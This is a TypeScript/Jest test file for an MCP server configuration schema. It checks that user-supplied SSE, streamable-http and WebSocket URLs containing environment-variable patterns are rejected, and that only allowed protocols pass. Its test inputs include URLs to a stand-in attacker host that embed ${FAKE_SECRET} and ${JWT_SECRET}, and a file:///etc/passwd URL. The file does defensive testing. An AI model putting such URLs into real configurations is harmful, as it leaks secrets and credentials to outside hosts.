import { SSEOptionsSchema, MCPServerUserInputSchema } from '../src/mcp';

describe('MCPServerUserInputSchema', () => {
  describe('env variable exfiltration prevention', () => {
    it('should confirm admin schema resolves env vars (attack vector baseline)', () => {
      process.env.FAKE_SECRET = 'leaked-secret-value';
      const adminResult = SSEOptionsSchema.safeParse({
        type: 'sse',
        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(adminResult.success).toBe(true);
      if (adminResult.success) {
        expect(adminResult.data.url).toContain('leaked-secret-value');
      }
      delete process.env.FAKE_SECRET;
    });

    it('should reject the same URL through user input schema', () => {
      process.env.FAKE_SECRET = 'leaked-secret-value';
      const userResult = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(userResult.success).toBe(false);
      delete process.env.FAKE_SECRET;
    });
  });

  describe('env variable rejection', () => {
    it('should reject SSE URLs containing env variable patterns', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(result.success).toBe(false);
    });

    it('should reject streamable-http URLs containing env variable patterns', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'http://attacker.com/?jwt=${JWT_SECRET}',
      });
      expect(result.success).toBe(false);
    });

    it('should reject WebSocket URLs containing env variable patterns', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'ws://attacker.com/?secret=${FAKE_SECRET}',
      });
      expect(result.success).toBe(false);
    });
  });

  describe('protocol allowlisting', () => {
    it('should reject file:// URLs for SSE', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'file:///etc/passwd',
      });
      expect(result.success).toBe(false);
    });

    it('should reject ftp:// URLs for streamable-http', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'ftp://internal-server/data',
      });
      expect(result.success).toBe(false);
    });

    it('should reject http:// URLs for WebSocket', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'http://example.com/ws',
      });
      expect(result.success).toBe(false);
    });

    it('should reject ws:// URLs for SSE', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'ws://example.com/sse',
      });
      expect(result.success).toBe(false);
    });
  });

  describe('valid URL acceptance', () => {
    it('should accept valid https:// SSE URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'https://mcp-server.com/sse',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.url).toBe('https://mcp-server.com/sse');
      }
    });

    it('should accept valid http:// SSE URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'sse',
        url: 'http://mcp-server.com/sse',
      });
      expect(result.success).toBe(true);
    });

    it('should accept valid wss:// WebSocket URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'wss://mcp-server.com/ws',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.url).toBe('wss://mcp-server.com/ws');
      }
    });

    it('should accept valid ws:// WebSocket URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'websocket',
        url: 'ws://mcp-server.com/ws',
      });
      expect(result.success).toBe(true);
    });

    it('should accept valid https:// streamable-http URLs', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'streamable-http',
        url: 'https://mcp-server.com/http',
      });
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.url).toBe('https://mcp-server.com/http');
      }
    });

    it('should accept valid http:// streamable-http URLs with "http" alias', () => {
      const result = MCPServerUserInputSchema.safeParse({
        type: 'http',
        url: 'http://mcp-server.com/mcp',
      });
      expect(result.success).toBe(true);
    });
  });
});
